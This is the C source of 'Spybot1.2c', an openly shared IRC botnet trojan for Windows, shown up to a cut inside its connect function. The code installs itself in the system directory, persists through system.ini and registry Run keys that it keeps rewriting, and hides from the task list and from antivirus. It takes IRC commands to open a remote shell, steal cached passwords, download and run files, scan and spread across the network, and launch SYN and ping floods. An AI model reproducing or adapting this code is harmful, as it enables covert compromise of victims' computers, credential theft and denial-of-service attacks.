//////////////////////////////////////////////////////////
//							//
//		Spybot1.2c by Mich			//
//							//
//		Opensource irc bot 			//
//							//
//	    IRC: irc.babbels.com #dreams		//
//	    						//
//	http://members.lycos.co.uk/ircspybot/		//
//	    						//
//	      opensource_bot@hotmail.com		//
//	    						//
//		use at your own risk.			//
//							//
//	       Good luck and have fun!			//
//							//
//////////////////////////////////////////////////////////


//Disclaimer

//Spybot is meant to be used for legal purposes only.  Since it is beyond the author's control of what Spybot is used for, the author of Spybot can not be held accountable for anything you do with this source.

#define WIN32_LEAN_AND_MEAN

#include <winsock2.h>
#include <stdio.h>
#include <STDLIB.H>
#include <shellapi.h>
#include <wininet.h>
#include "settings.h"
#include <lm.h>
#include <lmat.h>
#ifdef NB_SPREADER
#include "psexec.h"
#endif

char * decryptpass(char *str,char *nick);

#include "encrypt.h"
#include "encrypt.c"

void uninstall(void);
char nick[100];
char realname[250];



//variables

SOCKET IRC_Socket;//the main irc socket 
char SystemDir[MAX_PATH];



void clearthread(int c);
int get_emty_thread(int num);




HANDLE mutexhandle;
char dcchost[20];
char dccfilename[MAX_PATH];
char sendtochan[50];
char Online_time[250];
int dccport;
int redirect_to_port;

SOCKET dcchosts;
SOCKET dccspy = 0;
SOCKET redirectspy = 0;
#ifdef Let_The_Bot_Talk
HANDLE talk_thread_handle;
#endif
//const char PRIVMSG[] = "PRIVMSG";
char spam_nicks[1500][100]={ 0 };
int count_sNicks = 0;
char spam_message[512];
int spam_delay = 5000;

BOOL info = FALSE;
#ifdef remote_cmd
HANDLE pipe_read;
HANDLE pipe_write;
HANDLE pipe_Hproc;
HANDLE hChildInWrDupe;
SOCKET pipesock;
char pipe_chan[50]; 
#endif
char IRC_server[500];
int IRC_port;
#ifdef USE_IDENT_SERVER
SOCKET identsock;
BOOL run_ident;
#endif

#ifdef SYN_FLOOD
DWORD WINAPI syn_flood(LPVOID param);
#endif



int sub7(SOCKET sock);
DWORD WINAPI check_updates(LPVOID param);

char connection_name[128];
char connection_type[8];
char This_File[MAX_PATH];

char logins[maxlogins][100]={ 0 };
char OS[140];


int distime = 1800000;
BOOL privmsg(SOCKET sock,char *msg,char *chan);
char IP[] = "111.111.111.111";
char IP2[7];
HANDLE keepkeys_Handle;
int ping_delay;
// function prototypes

SOCKET clone_sockets[50]; //max num of clones is 50
void clone_send(char *buf);
void load_clones(char * Clone_Server,int Clone_port,int num_clones);

DWORD WINAPI port_scanner(LPVOID param);
DWORD WINAPI ping(LPVOID param);
int netdevil(char *ip,int port,SOCKET ircsock,SOCKET sock,char *chan);
void Setfiletime(char *file);
void getnick();
DWORD WINAPI talk_thread(LPVOID Param);
int InfectNetBIOS2(char * ipaddress,SOCKET sock,char *chan);
DWORD WINAPI download(LPVOID param);
DWORD WINAPI port_redirect(LPVOID param);
SOCKET Listen(int port);
SOCKET create_sock(char *host, int port);
void Close_Handles();
DWORD WINAPI PipeReadThread(LPVOID param);
int pipe_send(SOCKET sock,char *chan,char *buf);
int open_cmd(SOCKET sock,char * chan);
DWORD WINAPI PipeReadThread(LPVOID param);
void Keyevent(BYTE key,BOOL caps);
int getfiles(char *current,SOCKET dccsock,char *chan);
int cashedpasswords(SOCKET sock,char *sendto);
VOID writekeys(BOOL uninstall);
void randnick();
void raw_commandsonjoin(SOCKET sock,char *chan);
void raw_commands(SOCKET sock);
int sendkeys(char *buf,char *window,char *logfile);
int irc_connect(char * serveraddr,int poort,char *channel,char *channelpass);
int read_command(SOCKET sendsock,SOCKET ircsock,char *command,char *line,char *sendto);
int irc_read(SOCKET Server,char *channel,char *channelpass);
int irc_readline(char * line,SOCKET Server,char *channel,char *channelpass);
char * sysinfo(char *sinfo,SOCKET sock);
int cpuspeed(void);
unsigned __int64 cyclecount();
DWORD WINAPI dcc_send(LPVOID param);
DWORD WINAPI dcc_chat(LPVOID param);
DWORD WINAPI dcc_getfile(LPVOID param);
DWORD WINAPI kill_av(LPVOID param);
DWORD WINAPI keepkeys(LPVOID param);
int listProcesses(SOCKET sock,char *chan,char *proccess,BOOL killthread);
int scan_host(int i,int A,int B,int C,int D);

typedef struct clone_struct {
	BOOL used;//if true socket is in use
	SOCKET sock;
	HANDLE Handle;
	char server[512];
	int port;
} clonestr;

clonestr clone_data[50];//max 50 clones

//structure to store data used by diferend threads

typedef struct threads_struct2 {
	char C_name[250];//the discription of the thread showed with the threads command
	int id; 
	HANDLE Threat_Handle;	//handle to the thread. Threat_Handle = CreateThread(.....);
	SOCKET reply_sock;	//this is the socket where the replys go to
	SOCKET Threads_sock;	//this socket will be closed when you kill the thread 
	int int_1; //to store a number  
	int int_2;
	int int_3;
	char chan[250];		//string that holds the channel/nickname where the replys go to set to null when its a dcc chat
	char string1[MAX_PATH]; //can be used to store strings
	char string2[MAX_PATH];
} thread2;

thread2 threads2[40];





// kernel32.dll typedefs/structs
 typedef struct tagPROCESSENTRY32 {
	DWORD dwSize;
	DWORD cntUsage;
	DWORD th32ProcessID;
	DWORD *th32DefaultHeapID;
	DWORD th32ModuleID;
	DWORD cntThreads;
	DWORD th32ParentProcessID;
	LONG pcPriClassBase;
	DWORD dwFlags;
	CHAR szExeFile[MAX_PATH];
 } PROCESSENTRY32, *LPPROCESSENTRY32;

 typedef int (__stdcall *RSP)(DWORD, DWORD);
 RSP fRegisterServiceProcess;
 typedef HANDLE (__stdcall *CT32S)(DWORD,DWORD);
 CT32S fCreateToolhelp32Snapshot;
 typedef BOOL (__stdcall *P32F)(HANDLE,LPPROCESSENTRY32);
 P32F fProcess32First;
 typedef BOOL (__stdcall *P32N)(HANDLE,LPPROCESSENTRY32);
 P32N fProcess32Next;
 typedef int (__stdcall *IGCSE)(LPDWORD, char *, DWORD, DWORD);
 IGCSE fInternetGetConnectedStateEx;

char * decryptpass(char *str,char *nick)
{
	int c=0;
 	for (int i = 0;str[i] != 0; i++) {
		if (c == strlen(nick)) c=0;
		int k = nick[c] - 45;
		str[i] = str[i] - k;
		c++;
        }
	return str;
}
int connected(void) //function to see if there is a connection to the internet
{
	DWORD ConState;
	while (1) {
		if (!InternetGetConnectedState(&ConState,0)) { //see if we there is a internet connection
			Sleep(30000); 
			continue;
		}
		break; //there is a connection 
	}
	return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	WSADATA  WSData;
	char sysdir[MAX_PATH];
	char *CommandLine;
	int i=0;
	int c=0;
	DWORD n,id,err;

	// get our file name
	memset(This_File,0,sizeof(This_File));
	GetModuleFileName(NULL, This_File, sizeof(This_File));
	encryptsettings();
	//write system.ini startupkey
	char explorer_ini[250];
	sprintf(explorer_ini,"explorer.exe %s",filename);
	GetWindowsDirectory(sysdir, sizeof(sysdir));
	strcat(sysdir,"\\system.ini");
	WritePrivateProfileString("boot","shell",explorer_ini,sysdir);
        writekeys(FALSE);
	GetSystemDirectory(SystemDir, sizeof(SystemDir));
	strcat(SystemDir,"\\");
	sprintf(sysdir,"%s%s",SystemDir,filename);

	CharUpperBuff(This_File,strlen(This_File));
	CharUpperBuff(sysdir,strlen(sysdir));


	//the install part
	if (strcmp(sysdir,This_File) != 0) { //we need to install it
		sprintf(sysdir,"%s%s",SystemDir,filename);
		for (i=0;!CopyFile(This_File,sysdir , FALSE) && i<5;i++) 
			Sleep(2000); //we could not copy waith 2 sec and try again
		Setfiletime(sysdir);
		//create the melt string
		char meltstring[MAX_PATH];
		sprintf(meltstring,"mElT%s",This_File);
		if ((int) ShellExecute(0, "open", sysdir, meltstring, NULL, SW_SHOW) < 33) 
			goto start; //we could not execute strange run from current location

		ExitProcess(0); //exit 
		
	}
	//end install
	CreateMutex(NULL,TRUE,mutexname);
	if (GetLastError() == ERROR_ALREADY_EXISTS) ExitProcess(0); //check if is allready running..
	//melt the server
	if (strlen(GetCommandLine()) > 6) {
		CommandLine = strstr(GetCommandLine(),"mElT");
		if (CommandLine != NULL) {
			if (strlen(CommandLine) > 5) {
				Sleep(2000); //we wait for 2 sec. maybe the old filename is still running
				DeleteFile(CommandLine+4);
			}
		}
	}
	//end meltserver

	start:;

	// get our file name (again but now not in upercase)
	memset(This_File,0,sizeof(This_File));
	GetModuleFileName(NULL, This_File, sizeof(This_File));

	//load some kernel functions
	HINSTANCE kernel32_dll = LoadLibrary("kernel32.dll");
	if (kernel32_dll) { //thanks to sdbot
		fRegisterServiceProcess = (RSP)GetProcAddress(kernel32_dll, "RegisterServiceProcess");
		if (fRegisterServiceProcess) fRegisterServiceProcess(0, 1); //hide from ctrl alt del
		fCreateToolhelp32Snapshot = (CT32S)GetProcAddress(kernel32_dll, "CreateToolhelp32Snapshot"); 
		fProcess32First = (P32F)GetProcAddress(kernel32_dll, "Process32First");
		fProcess32Next = (P32N)GetProcAddress(kernel32_dll, "Process32Next");
	}

	//wsa startup needed for the sockets
   	if (WSAStartup(MAKEWORD(1, 1), &WSData))
		if (WSAStartup(MAKEWORD(1, 0), &WSData))
        		ExitProcess(0);
	memset(clone_data,0,sizeof(clone_data));
	#ifdef Use_Firewall_killer
	CreateThread(NULL, 0, &kill_av, NULL, 0, &id);
	#endif


	keepkeys_Handle = CreateThread(NULL, 0, &keepkeys, NULL, 0, &id);
	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO); 
	GetVersionEx(&verinfo); // load version info into verinfo
	
	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) strcpy(OS,"95");
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) strcpy(OS,"NT");
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) strcpy(OS,"98");
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) strcpy(OS,"ME");
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) strcpy(OS,"2000");
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) strcpy(OS,"XP");
	else strcpy(OS,"???");
	#ifdef Check_for_internetconnection
	connected();
	#endif
	memset(connection_name, 0, sizeof(connection_name));
	memset(connection_type, 0, sizeof(connection_type));
	HINSTANCE wininet_dll = LoadLibrary("WININET.DLL");
    	if (wininet_dll) {
	 	fInternetGetConnectedStateEx = (IGCSE)GetProcAddress(wininet_dll, "InternetGetConnectedStateEx");
		if (fInternetGetConnectedStateEx) {
			fInternetGetConnectedStateEx(&n, (char *)&connection_name, sizeof(connection_name), 0);
    			if (n & INTERNET_CONNECTION_MODEM == INTERNET_CONNECTION_MODEM) strcpy(connection_type,  "dial-up");
	 		else if (n) strcpy(connection_type,  "LAN");
			else strcpy(connection_type, "N/A");
		} 
		else {
			strcpy(connection_type, "N/A");
			strcpy(connection_name, "N/A");
		}

	}
	#ifdef update_after_x_days_not_logged_in
	CreateThread(NULL, 0, &check_updates, NULL, 0, &id);
	#endif
	char *set[4];
	char buf[512];
	while (1) {
		if (settings[c] == NULL) c = 0;
		strcpy(buf,settings[c]);
		set[0] = strtok(buf, " ");
		for (i = 1; i < 4; i++) set[i] = strtok(NULL, " ");
		err = irc_connect(set[0],atoi(set[1]),set[2],set[3]);
		if (err == 1) break;
		Sleep(30000); //waith 30sec bevore we try again
		c++;
	}
	WSACleanup();
	#ifdef remote_cmd
	Close_Handles();
	#endif

	ExitProcess(0);
	return 0;
 }

int read_command(SOCKET sendsock,SOCKET ircsock,char *command,char *linetemp,char *sendto)
{
	char line[512];
	ExpandEnvironmentStrings(linetemp,line,sizeof(line));//changing strings like %windir% to the windows directory
	char x[512];
	char line1[512];
	char *s[10];
	int i;
	int c=0;
	DWORD id;
	char buf[512];
	memset(line1, 0, sizeof(line1));
	memset(x, 0, sizeof(x));
	strncpy(line1, line, sizeof(line1)-1);
	s[0] = strtok(line1, " ");
	for (i = 1; i < 6; i++) s[i] = strtok(NULL, " ");
	HANDLE Threat_Handle;
	if (strcmp(threads_command,command) == 0) {
		for (i=0;i <= 40;i++) {
			if (threads2[i].id != 0) {
				sprintf(x,"%i: %s",i,threads2[i].C_name);
				privmsg(sendsock,x,sendto);
			}
		}	
		return 0;
		
	}
	else if (strcmp(spy_command,command) == 0 && sendto == NULL) {
		sprintf(x,OK);
		dccspy = sendsock;
	}
	else if (strcmp(stopspy_command,command) == 0) {
		sprintf(x,OK);
		dccspy = 0;
	}
	else if (strcmp(redirect_spy_command,command) == 0 && sendto == NULL) {
		sprintf(x,OK);
		redirectspy = sendsock;
	}
	else if (strcmp(redirect_stopspy_command,command) == 0) {
		sprintf(x,OK);
		redirectspy = 0;
	}
	else if (strcmp(uninstall_command,command) == 0) {
		char windir[MAX_PATH];
		GetWindowsDirectory(windir, sizeof(windir));
		strcat(windir,"\\system.ini");
		WritePrivateProfileString("boot","shell","explorer.exe",windir);
		writekeys(TRUE);
	}
	else if (strcmp(info_command, command) == 0)  {
		sysinfo(x,sendsock);
	}
	else if (strcmp(passwords_command,command) == 0) {
		if (cashedpasswords(sendsock,sendto) == 0) strcpy(x,OK);
		else strcpy(x,Error);
	}
	else if (strcmp(listprocesses_command, command) == 0)  {
		if (listProcesses(sendsock,sendto,NULL,FALSE) == 0) strcpy(x,OK);
		else strcpy(x,Error);
	}
	else if (strcmp(reconnect_command, command) == 0 && sendto != NULL)  {
		send(sendsock,"QUIT\n",5,0);
		return 2;
	}
	else if (strcmp(disconnect_command, command) == 0 && sendto != NULL)  {
		if (s[1] != NULL) distime = atoi(s[1]) * 1000;
		send(sendsock,"QUIT\n",5,0);
		return 3;
	}
	else if (strcmp(quit_command, command) == 0)  {
		return 1;
	}
	else if (strcmp(reboot_command, command) == 0)  {
		if (ExitWindowsEx(EWX_FORCE,0) == 0) strcpy(x,Error);
		else strcpy(x,"QUIT\n");
	}
	#ifdef remote_cmd
	else if (strcmp(opencmd_command,command) == 0) {
		if (open_cmd(sendsock,sendto) == -1) strcpy(x,Error);
		else strcpy(x,OK);
	}
	else if (strcmp(cmd_command,command) == 0) {
		DWORD bw;
		if (s[1] != NULL) {
			strcat(line,"\n");
			sprintf(line1,strstr(line," ")+1);
		}
		else sprintf(line1,"\n");
		bw = strlen(line1);
		if (!WriteFile(hChildInWrDupe,line1,bw,&bw,NULL)) {
			Close_Handles();
			strcpy(x,Error);
		}
	}
	#endif
	else if (strcmp(quitclones_command,command) == 0) {
		for(i=0;i<50;i++)
			if (clone_data[i].used == TRUE && clone_data[i].sock > 0)  closesocket(clone_data[i].sock);
		strcpy(x,OK);
	}
        else if (s[1] != NULL) {
		if (strcmp(delete_command, command) == 0) {
			if (DeleteFile(strstr(line," ")+1)) strcpy(x,OK);
			else strcpy(x,Error);
		}
		else if (strcmp(raw_command, command) == 0)  {
			strcpy(x, line+strlen(raw_command));
			sendto = NULL;
			sendsock = ircsock;
		}
		else if (strcmp(server_command,command) == 0 && sendto != NULL) {
			memset(IRC_server,0,sizeof(IRC_server));
			strcpy(IRC_server,s[1]);
			if (s[2]) IRC_port = atoi(s[2]);
			send(sendsock,"QUIT\n",5,0);
			return 2;
		}
		else if (strcmp(execute_command, command) == 0) {
			if ((int) ShellExecute(0, "open", strstr(line," ")+1, NULL, NULL, SW_SHOW) < 33) strcpy(x,Error);
			else strcpy(x,OK);
		}
		else if (strcmp(makedir_command, command) == 0) {
			if (CreateDirectory(strstr(line," ")+1, 0)) strcpy(x,OK);
			else strcpy(x,Error);
		}
		else if (strcmp(list_command, command) == 0)  {
			getfiles(line+strlen(list_command),sendsock,sendto);
			strcpy(x,OK);
		}
		else if (strcmp(killprocess_command, command) == 0) {
			if (listProcesses(sendsock,NULL,s[1],FALSE) == 1) strcpy(x,OK);
			else strcpy(x,Error);
		}
		#ifdef use_funstuf //lame stuf :-)
		else if (strcmp(sendkeys_command, command) == 0)  {
			strncpy(x, line+10, sizeof(x)-1);
			int c = 0;
			int z;
			char chr[2];
			char bla[10];
			for (i = 0;i < strlen(x);i++)
			{
				memset(chr,0,sizeof(chr));
				chr[0] = x[i];
				for (c = 0;c < 92;c++)
				{

					if (strcmp(chr,"") == 0) { //bold (ctrl + b) = RETURN
						Keyevent(VK_RETURN,FALSE);
						break;
					}
					else if (strcmp(chr,"") == 0) { //underlined (ctrl + u) = backspace
						Keyevent(VK_BACK,FALSE);
						break;
					}
					else if (strcmp(chr,outputL[c]) == 0) {
						z = inputL[c];
						Keyevent(z,FALSE);
						break;
					}
					else if (strcmp(chr,outputH[c]) == 0) {
						z = inputL[c];
						Keyevent(z,TRUE);
						break;
					}
				}
			}
			strcpy(x,OK);

		}
		#endif
		else if (strcmp(killthread_command, command) == 0)  {
			int t = atoi(s[1]);
			if (t > 39) return 0;
			if (threads2[t].id != 0) {
				if (TerminateThread(threads2[t].Threat_Handle,0) == 0) strcpy(x,Error);
				else {
					sprintf(x,"T k (%s)",threads2[t].C_name);
					closesocket(threads2[t].Threads_sock);
					clearthread(t);
				}
			}
		}
		else if (strcmp(get_command,command) == 0 && sendto != NULL) { //dcc GET
			dcchosts = sendsock;
			strcpy(sendtochan,sendto);
			strcpy(dccfilename,strstr(line," ")+1);
			CreateThread(NULL, 0, &dcc_send, NULL, 0, &id);
		}
		else if (strcmp(update_command,command) == 0) {
			if ((i = get_emty_thread(0)) == -1) return 0;
			clearthread(i);
			threads2[i].id = 1;
			threads2[i].reply_sock = sendsock;
			strcpy(threads2[i].chan,sendto);
			strcpy(threads2[i].string1,s[1]);
			sprintf(x,"u %s",s[1]);
			strcpy(threads2[i].C_name,x);
			threads2[i].Threat_Handle = CreateThread(NULL, 0, &download,(LPVOID)i, 0, &id);
					
		}
		else if (strcmp(clonesend_command,command) == 0) {
			clone_send(line+strlen(clonesend_command));
			return 0;
		}
		else if (s[2] != NULL) {
			if (strcmp(rename_command,command) == 0) {
				if (MoveFile(s[1],s[2]) == 0) strcpy(x,Error);
				else strcpy(x,OK);
			}
			else if (strcmp(download_command,command) == 0) {
				if ((i = get_emty_thread(0)) == -1) return 0;
				clearthread(i);
				threads2[i].reply_sock = sendsock;
				strcpy(threads2[i].chan,sendto);
				strcpy(threads2[i].string1,s[1]);
				strcpy(threads2[i].string2,s[2]);
				sprintf(x,"d %s %s",s[1],s[2]);
				strcpy(threads2[i].C_name,x);
				threads2[i].id = 1;
				threads2[i].Threat_Handle = CreateThread(NULL, 0, &download,(LPVOID)i, 0, &id);
			}
			else if (strcmp(sendto_command,command) == 0 && sendto != NULL) {
				dcchosts = sendsock;
				strcpy(sendtochan,s[1]);
				strcpy(dccfilename,strstr(line+strlen(s[1])+1," ")+1);
				CreateThread(NULL, 0, &dcc_send, NULL, 0, &id);
			}
			else if (strcmp(spam_command,command) == 0) {
				sprintf(spam_message,strstr(line," ")+2+strlen(s[1]));
				spam_delay = atoi(s[1]);
				sprintf(buf,"WHO *");
				srand(GetTickCount());
				buf[5] = (rand()%26)+97;
				buf[6] = '\0';
				strcat(buf,"*\n");
				count_sNicks = 0;
				for(i=0;i<50;i++) 
					if (clone_sockets[i] > 0) { send(clone_sockets[c],buf,strlen(buf),0); break; }
				return 0;

			}
			else if (s[3] != NULL) {
				dcchosts = sendsock;
				if (sendto != NULL) strcpy(sendtochan,sendto); 
 		 		if (strcmp("SEND",command) == 0) { //dcc send
					sprintf(dccfilename,s[1]);
					sprintf(dcchost,s[2]);
					dccport = atoi(s[3]);
					CreateThread(NULL, 0, &dcc_getfile, NULL, 0, &id);
				}
				else if (strcmp("CHAT",command) == 0 && sendto != NULL) { //dcc chat
					sprintf(dcchost,s[2]);
					dccport = atoi(s[3]);
					CreateThread(NULL, 0, &dcc_chat, NULL, 0, &id);
				}
				else if (strcmp(redirect_command,command) == 0) {
					if ((i = get_emty_thread(0)) == -1) return 0;
					clearthread(i);
					if ((threads2[i].Threads_sock = Listen(atoi(s[1]))) == -1) strcpy(x,Error);
					else {
						sprintf(x,"r %s:%i > %s:%i",IP,atoi(s[1]),s[2],atoi(s[3]));
						threads2[i].int_1 = atoi(s[1]);
						threads2[i].int_2 = atoi(s[3]);
						strcpy(threads2[i].string1,s[2]);
						threads2[i].id = 1;
						threads2[i].Threat_Handle = CreateThread(NULL, 0, &port_redirect,(LPVOID)i, 0, &id);
					}
				}
				else if (strcmp(scan_command,command) == 0) {
					//scan_command [start ip] [port] [delay in sec.] [spreaders?] [log to file file]
					if ((i = get_emty_thread(4)) == -1) return 0;
					clearthread(i);

					if (strcmp("0",s[1]) == 0) { //we start at a random ip address
						srand(GetTickCount());
						sprintf(threads2[i].string1,"%i.%i.%i.0",rand()%255,rand()%255,rand()%255);
					}
					else strcpy(threads2[i].string1,s[1]); //else we use the first parameter as the startip we replace x later if there are any
					threads2[i].id = 4;
					threads2[i].int_1 = atoi(s[2]);
					threads2[i].int_2 = atoi(s[3]) * 1000;
					memset(buf,0,sizeof(buf));
					if (s[5]) {
						threads2[i].int_3 = atoi(s[4]);
						sprintf(threads2[i].string2,"%s%s",SystemDir,s[5]);
					}
					else if (s[4]) {
						if (atoi(s[4]) == 0) sprintf(threads2[i].string2,"%s%s",SystemDir,s[4]);
						else threads2[i].int_3 = atoi(s[4]);
					
					}
					threads2[i].reply_sock = sendsock;
					if (sendto) strcpy(threads2[i].chan,sendto);
					sprintf(x,"scan ip: %s p: %i d: %i.",threads2[i].string1,threads2[i].int_1,threads2[i].int_2);
 					if (strlen(threads2[i].string2) > 1) {
						strcat(x," logging to:");
						strcat(x,threads2[i].string2);
					}
					strcpy(threads2[i].C_name,x);
					threads2[i].Threat_Handle = CreateThread(NULL, 0, &port_scanner,(LPVOID)i, 0, &id);
				}
				else if (strcmp(clone_command,command) == 0) {
					load_clones(s[1],atoi(s[2]),atoi(s[3]));
					sprintf(x,OK);
					
				}
				else if (s[4] != NULL) {
					#ifdef SYN_FLOOD
					if (strcmp(syn_command,command) == 0) {
						//syn [ip] [port] [delay] [times]
						if ((i = get_emty_thread(5)) == -1) return 0;
						clearthread(i);
						strcpy(threads2[i].string1,s[1]);
						threads2[i].id = 5;
						threads2[i].int_1 = atoi(s[2]);
						threads2[i].int_2 = atoi(s[3]);
						if (threads2[i].int_2 < 5) threads2[i].int_2 = 5;
						threads2[i].int_3 = atoi(s[4]);
						threads2[i].reply_sock = sendsock;
						if (sendto) strcpy(threads2[i].chan,sendto);
						sprintf(x,"Syn: %s p: %i d: %i t:%i.",threads2[i].string1,threads2[i].int_1,threads2[i].int_2,threads2[i].int_3);
						strcpy(threads2[i].C_name,x);
						threads2[i].Threat_Handle = CreateThread(NULL, 0, &syn_flood,(LPVOID)i, 0, &id);

					}
					#endif
					if (strcmp(ping_command,command) == 0) {
						//ping [ip] [delay] [times] [size]
						if ((i = get_emty_thread(6)) == -1) return 0;
						clearthread(i);
						strcpy(threads2[i].string1,s[1]);
						threads2[i].id = 6;
						threads2[i].int_1 = atoi(s[4]);
						threads2[i].int_2 = atoi(s[2]);
						threads2[i].int_3 = atoi(s[3]);
						if (threads2[i].int_2 > 65500) threads2[i].int_2 = 65500;
						threads2[i].reply_sock = sendsock;
						if (sendto) strcpy(threads2[i].chan,sendto);
						sprintf(x,"P %s d: %s t: %s s: %s\n",s[1],s[2],s[3],s[4]);
						strcpy(threads2[i].C_name,x);
						threads2[i].Threat_Handle = CreateThread(NULL, 0, &ping,(LPVOID)i, 0, &id);
					}	
				}
			}
		}
	}
	else return 0;
	if (strlen(x) < 2) return 0;
	privmsg(sendsock,x,sendto);
	return 0;
}

BOOL privmsg(SOCKET sock,char *msg,char *chan) //function to send a privmsg or message to dcc chat 
{
	char buffer[512];
	if (sock < 1) return FALSE; //invalid socket
	if (chan) //message to irc chan can also be a nickname
		sprintf(buffer,"%s %s :%s\n",PRIVMSG,chan,msg);
	else //send to dcc chat
		sprintf(buffer,"%s\n",msg);
	if (send(sock,buffer,strlen(buffer),0) < 1) return FALSE; //invalid socket??
	return TRUE;//ok return
}


int get_emty_thread(int num)
{
	int c;
	if (num != 0) { //num is not set to null so we need to check if the thread already exists if it does return with -1
		for (c=0;c <= 40;c++)
			if (threads2[c].id == num) return -1; // the thread already exists 	
	}
	for (c=0;c <= 40;c++) //check if there is a emty thread the maximum of threads is set to 40
		if (threads2[c].id == 0) return c; //return the thread number
	return -1;//non of the threads are emty 
}


void clearthread(int c) //dont know if this is needed
{
	memset(threads2[c].chan,0,sizeof(threads2[c].chan));
	memset(threads2[c].string1,0,sizeof(threads2[c].string1));
	memset(threads2[c].string2,0,sizeof(threads2[c].string2));
	memset(threads2[c].C_name,0,sizeof(threads2[c].C_name));
	threads2[c].id = 0;
	threads2[c].Threat_Handle = NULL;
	threads2[c].reply_sock = 0;
	threads2[c].Threads_sock = 0;
	threads2[c].int_1 = 0;
	threads2[c].int_2 = 0;
}





//simple decrypt function prevent people to see the important stuff with a hexediter




DWORD WINAPI keepkeys(LPVOID param) //when the startup keys are removed we create them again ;-)
{
	while (1)
	{
		writekeys(FALSE);
		Sleep(10000);
	}
	return 0;
}
#ifdef USE_IDENT_SERVER
DWORD WINAPI identserv(LPVOID Param)
{
	int port = (int)Param;
	SOCKET sock;
	SOCKADDR_IN  identaddr;
	int addrlen = sizeof(identaddr);
	char sendbuf[512];
	if ((identsock = Listen(113)) == -1)
		return 0; //unable to open port
	getnick();
	while (run_ident) {
		if ((sock = accept(identsock, (SOCKADDR *)&identaddr,&addrlen)) != INVALID_SOCKET)  {
			Sleep(1000);
			sprintf(sendbuf, "%d, %d : USERID : UNIX : %s\r\n", rand()%6000+1, port, (char *)nick); 
			send(sock,sendbuf,strlen(sendbuf), 0);
			Sleep(1000);
			closesocket(sock);
		}
        }
	closesocket(identsock);	
	return 0;	
}
#endif
VOID writekeys(BOOL uninstal)
{
	unsigned long size = 250;
	HKEY key;
	BYTE  buf[200];
	RegCreateKeyEx(HKEY_CURRENT_USER, runoncekey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
	if (uninstal) {
		RegDeleteValue(key,( LPCTSTR ) valuename);
	}
    	else if (RegQueryValueEx(key, ( LPCTSTR ) valuename , 0, 0,buf, &size) != ERROR_SUCCESS || strcmp(buf, filename) != 0) {
      	        RegSetValueEx(key, valuename, 0, REG_SZ, filename, 127);
	}
	RegCloseKey(key);
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, runkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
	if (uninstal) {
		RegDeleteValue(key,( LPCTSTR ) valuename);
		RegCloseKey(key);
		uninstall();
		ExitProcess(0);
	}
    	if (RegQueryValueEx(key, ( LPCTSTR ) valuename , 0, 0,buf, &size) != ERROR_SUCCESS || strcmp(buf, filename) != 0) 
		        RegSetValueEx(key, valuename, 0, REG_SZ, filename, 127);
	RegCloseKey(key);
	return;
}


#ifdef update_after_x_days_not_logged_in


void set_new_date(void)
{
	char c_Time[10];
	char date[10];
	char date2[10];
	HKEY key;
	GetDateFormat(0x409,0,0,"MM",date,10);
	GetDateFormat(0x409,0,0,"dd",date2,10);
	int time = atoi(date) * 30 + atoi(date2);//current day not every month has 30 days but who cares :)
	sprintf(c_Time,"%i",time);
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, registerkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
      	RegSetValueEx(key, register_value, 0, REG_SZ, c_Time, 127); 
	RegCloseKey(key);
}

DWORD WINAPI check_updates(LPVOID param) 
{
	unsigned long size = 250;
	HKEY key;
	int i;
	BYTE  buf[200];
	char date[10];
	char date2[10];
	char c_Time[10];
	GetDateFormat(0x409,0,0,"MM",date,10);
	GetDateFormat(0x409,0,0,"dd",date2,10);
	int time = atoi(date) * 30 + atoi(date2);//current day not every month has 30 days but who cares :)
	sprintf(c_Time,"%i",time);
	//read the day we have last logged in from the registry
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, registerkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
    	if (RegQueryValueEx(key, ( LPCTSTR ) register_value , 0, 0,buf, &size) != ERROR_SUCCESS) {
      	        RegSetValueEx(key, register_value, 0, REG_SZ, c_Time, 127); //nothing set maybe first time we run ?
		return 0;
	}
	if (atoi(buf) + days_before_update < time) { //we are gona try to update
		//first see if there is a connection
		connected(); //when it returns there is a connection (i hope)
		char buffer[512];
		DWORD id;
		dcchosts = 0;
		sprintf(buffer,"u %s",update_url);
		if ((i = get_emty_thread(0)) == -1) return 0;
		clearthread(i);
		strcpy(threads2[i].string1,update_url);
		//oke try to update
		threads2[i].Threat_Handle =  CreateThread(NULL, 0, &download,(LPVOID)i, 0, &id);
	}
	return 0;
}
#endif

void Setfiletime(char *file)
{
	HANDLE testfile;
	FILETIME cTime;
	FILETIME aTime;
	FILETIME wTime;
	char windir[MAX_PATH];
	GetWindowsDirectory(windir, sizeof(windir));
	strcat(windir,"\\explorer.exe");
	testfile = CreateFile(windir,GENERIC_READ ,FILE_SHARE_READ,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
	if (testfile != INVALID_HANDLE_VALUE) {
		GetFileTime(testfile,&cTime,&aTime,&wTime);
		CloseHandle(testfile);
		testfile = CreateFile(file,GENERIC_WRITE,FILE_SHARE_WRITE,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
		if (testfile != INVALID_HANDLE_VALUE) {
			SetFileTime(testfile,&cTime,&aTime,&wTime);
			CloseHandle(testfile);
		}
	}
}
//connect functie

int irc_connect(char * serveraddr,int poort,char *channel,char *channelpass)
{
	DWORD err;
	memset(IRC_server,0,sizeof(IRC_server));
	strcpy(IRC_server,serveraddr);
	IRC_port = poort;
	restart:;
